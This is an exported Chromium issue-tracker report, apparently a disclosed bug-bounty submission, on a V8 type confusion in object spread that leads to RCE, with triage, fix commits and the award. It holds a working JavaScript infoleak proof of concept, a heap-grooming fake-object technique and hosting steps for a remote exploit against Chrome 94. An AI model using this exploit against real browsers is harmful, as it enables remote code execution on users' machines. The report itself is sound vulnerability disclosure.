# Security: V8 CreateLiteral type confusion when processing ..spread leads to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [40057609](https://issues.chromium.org/issues/40057609) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>API |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | bt...@gmail.com |
| **Assignee** | pt...@chromium.org |
| **Created** | 2021-10-14 |
| **Bounty** | $20,000.00 |

## Description

This bug is split off from <https://crbug.com/chromium/1260109> to track the V8 type confusion bug portion of that report. Details below are copied from that bug.

**-------------------------**

= RCE: Type confusion when creating an object literal with the `...spread operation`  

**-------------------------** -------------------------------------------------------

I. VULNERABILITY DETAILS

When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.

```
var source = { n : 5 };  
var object = { ...source };  

```

Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.

```
Object.prototype.__defineSetter__(0, function() {  
   duped = this;   
});  
var source = { n : 5 };  
var result = { ...source, 0 : 5 };  
%DebugPrint(result);  
%DebugPrint(duped);  

```

Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].

```
Object.prototype.__defineSetter__(0, function() {  
   duped = this;   
});  
var source = { n : 5 };  
var result = { ...source, 0 : 5, ...duped };  

```

II. EXPLOITATION DETAILS

Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:

```
var a = { n : 5 };  
  
let return_double = function() {  
    return 5.5;  
}  
  
Object.prototype.__defineSetter__(0, function() {   
    duped = this;  
    duped.__defineGetter__('getter', return_double);  
    duped.o = 1.1;  
    duped.p = 1.1;  
    duped.q = 1.1;  
    duped.r = 1.1;  
    duped.s = 1.1;  
    duped.t = 1.1;  
  
    /\*  
        1. Create `b` an object that shares a map  
           map with `duped`.  
    \*/  
    b = {};  
    b.n = 5;   
    b.__defineGetter__('getter', return_double);  
    b.o = 1.1;  
    b.p = 1.1;  
    b.q = 1.1;  
    b.r = 1.1;  
    b.s = 1.1;  
    b.t = 1.1;  
  
    // deprecate `duped`'s map  
    b.n = 1.1;  
  
  
    // Fill up the SplitMap's transition array  
    for (var i = 0; i < 1024 + 1024; i++) {  
        var tmp = {};  
        tmp.n = 5;  
        tmp['tt' + i.toString()] = 5;  
    }  
  
});  
  
var obj = { ...a , 0 : 5 , ...duped};  
  
print(obj.o);  
print(obj.p);  
print(obj.q);  
print(obj.r);  
print(obj.s);  
print(obj.t);  

```

Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in\_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace

```
Before GC:  
[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]  
  
After GC:  
[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]  

```

Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.

NOTE: The GC timing is deterministic for hosts with >2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.

III. REPRODUCTION DETAILS

POC

1. Build D8
2. ./out/x64.release/d8 poc.js
3. ./out/x64.debug/d8 poc.js

EXPLOIT

1. Create a fresh Ubuntu 18.04.6 VM and install Chrome
2. Install Google Chrome version 94.0.4606.81
3. Navigate to <https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html>  
   
   3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".
4. View the source in the attachment 28\_fakeobj\_remote\_fresh.tar.gz

[0] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=2993;drc=713ebae3b4ef42d00220097ab2f238ffe8e4b87e>  

[1] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=2992;drc=ed72593f177516f8a62d5c0ca19dc1f21259e71c>  

[2] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=3060;drc=ed72593f177516f8a62d5c0ca19dc1f21259e71c>  

[3] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=3216;drc=ed72593f177516f8a62d5c0ca19dc1f21259e71c>  

[4] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-internal-gen.cc;l=846;drc=ed72593f177516f8a62d5c0ca19dc1f21259e71c>  

[5] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects.cc;l=318;drc=ed72593f177516f8a62d5c0ca19dc1f21259e71c>  

[6] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects.cc;l=318;drc=77e713f5337adcbd082ce14af906595a7c8a8c71>  

[7] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects.cc;l=270;drc=77e713f5337adcbd082ce14af906595a7c8a8c71>

## Attachments

- [poc.js](attachments/poc.js) (text/plain, 921 B)
- [28_fakeobj_remote_fresh.tar.gz](attachments/28_fakeobj_remote_fresh.tar.gz) (application/octet-stream, 3.9 KB)

## Timeline

### ct...@chromium.org (2021-10-14)

PoC file from the report attached

### [Deleted User] (2021-10-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2021-10-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5172652287000576.

### ct...@chromium.org (2021-10-14)

And the server-side files for the RCE exploit attached here.

### ct...@chromium.org (2021-10-14)

Details from the reporter I forgot to copy over for the RCE exploit:

-------

To host the renderer exploit locally you need to change a few things:

SERVER
Host three https sites:
site1.com
site2.com
site3.com

And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with site1.com, site2.com, and site3.com in the javascript/html files within 28_fakeobj_remote_fresh.

CLIENT
1. Create a fresh Ubuntu 18.04.6 VM and install Chrome
2. Install Google Chrome version 94.0.4606.81
3. Navigate to https://site1.com/parent-6a204bd89f3c8348afd5c77c717a097a.html

-------

I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. 

I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?

I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.

### bt...@gmail.com (2021-10-14)

[Comment Deleted]

### ct...@chromium.org (2021-10-14)

It looks like https://crbug.com/chromium/1251366 was filed by clusterfuzz rather than from crash report data. It was merged back to M-95 but not M-94.

### bt...@gmail.com (2021-10-14)

[Comment Deleted]

### ct...@chromium.org (2021-10-14)

Ah yep, this is definitely unlucky timing. I'll leave this open for the V8 team to investigate your comment about root cause.

pthier@ you are the owner for https://crbug.com/chromium/1251366 -- is there additional work that could be done to address the root cause identified in https://crbug.com/chromium/1260129#c8?



### bt...@gmail.com (2021-10-14)

[Comment Deleted]

### wf...@chromium.org (2021-10-15)

[Empty comment from Monorail migration]

### bt...@gmail.com (2021-10-15)

[Comment Deleted]

### bt...@gmail.com (2021-10-15)

[Comment Deleted]

### wf...@chromium.org (2021-10-15)

[Empty comment from Monorail migration]

### pt...@chromium.org (2021-10-15)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-10-15)

[Empty comment from Monorail migration]

### pt...@chromium.org (2021-10-15)

Thanks for the report!
The second patch (https://crrev.com/c/3224666) has an issue with keyed properties, as used in your repro.
I am not sure how quickly we would have caught this problem without your report, so thanks a lot!
As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).

### gi...@appspot.gserviceaccount.com (2021-10-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/a1427aad7cefbe952c9db37a4a46d9b0af672943

commit a1427aad7cefbe952c9db37a4a46d9b0af672943
Author: Patrick Thier <pthier@chromium.org>
Date: Fri Oct 15 15:04:15 2021

Assert that we never copy properties from an object itself

When copying properties, it should never happen that source == target.
Add a CHECK to assert this assumption.

Bug: chromium:1260129
Change-Id: Ia5248e4363d85e13052db726fb7143897cea9c87
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3226779
Commit-Queue: Patrick Thier <pthier@chromium.org>
Reviewed-by: Toon Verwaest <verwaest@chromium.org>
Cr-Commit-Position: refs/heads/main@{#77418}

[modify] https://crrev.com/a1427aad7cefbe952c9db37a4a46d9b0af672943/src/objects/js-objects.cc


### [Deleted User] (2021-10-15)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ct...@chromium.org (2021-10-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-18)

[Empty comment from Monorail migration]

### va...@google.com (2021-10-26)

Any updates on this one? 
Does the CL in https://crbug.com/chromium/1260129#c18 fixed the issue?
Do we need additional back merges?

### [Deleted User] (2021-10-29)

pthier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### va...@chromium.org (2021-11-09)

Any updates on this one? 
Does the CL in https://crbug.com/chromium/1260129#c18 fixed the issue?
Do we need additional back merges?

### pt...@chromium.org (2021-11-09)

Sorry for my late reply. I was on vacation the last >2 weeks.

The CL in #18 just added an assertion to prevent potentially future problems and doesn't need backmerging.
The reported bug was fixed and merged to M95 already before the report (see https://crbug.com/1251366).

Should we backmerge the original fix to older versions as well (The bug was originally introduced in M70). IIUC M94 is on extended support and therefore we should backmerge the fix to M94 as well.

### [Deleted User] (2021-11-09)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-09)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-09)

This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M94. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M95. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M96. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M97. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-09)

Merge approved: your change passed merge requirements and is auto-approved for M97. Please go ahead and merge the CL to branch 4692 (refs/branch-heads/4692) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: benmason (Android), harrysouders (iOS), ceb (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-09)

Merge review required: M96 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-09)

Merge review required: M95 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: benmason (Android), harrysouders (iOS), None (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-09)

Merge review required: M94 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), matthewjoseph (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pt...@chromium.org (2021-11-10)

1. Why does your merge fit within the merge criteria for these milestones?
Security fix preventing RCE
2. What changes specifically would you like to merge? Please link to Gerrit.
https://crrev.com/c/3178969
3. Have the changes been released and tested on canary?
Yes
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
No
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.
The fix already shipped with M95. No further testing required.

### va...@chromium.org (2021-11-10)

cleaning up labels

Is my understanding correct, that we need to merge this to M94,M95,M96 and M97?

### pt...@chromium.org (2021-11-10)

We only need to merge the CL (https://crrev.com/c/3178969) to M94.
It originally shipped with M96 and was already merged to M95 (https://crrev.com/c/3219081)

### va...@chromium.org (2021-11-10)

Thanks! M95 is already stable, not sure in case the merge to M94 is needed.
Can someone PTAL and verify Extended stable back merge needs?

### ad...@google.com (2021-11-10)

We do not expect any further releases of M94. M96 will soon become both Stable and Extended Stable.

### va...@chromium.org (2021-11-11)

Thanks for confirming, Ade. 
No additional merges are needed.

### pb...@google.com (2021-11-11)

Your change has been approved for M97 Branch 4692,please go ahead and merge the CL manually asap so that it would be part of this week’s Dev/Beta release.

### [Deleted User] (2021-11-15)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pb...@google.com (2021-11-15)

Your change has been approved for M97 Branch 4692. Please go ahead and get the change merged to Branch 4692 manually asap so that it would be part of tomorrow's Dev and this week's first M97 Beta release.

### pt...@chromium.org (2021-11-16)

Removing Merge-Approved-97 label, as the fixing CL was already part of the M96 regular release cycle.

### am...@chromium.org (2022-01-04)

[Empty comment from Monorail migration]

### am...@google.com (2022-01-04)

[Empty comment from Monorail migration]

### am...@google.com (2022-01-06)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-01-06)

Congratulations, Brendon! The VRP Panel has decided to award you $20,000 for this high quality report + V8 exploit and patch bonus. Thank you for all your efforts and great work!  

### am...@chromium.org (2022-01-06)

[Empty comment from Monorail migration]

### am...@google.com (2022-01-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### ti...@chromium.org (2023-07-26)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1260129?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/chromium/1260109]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057609)*
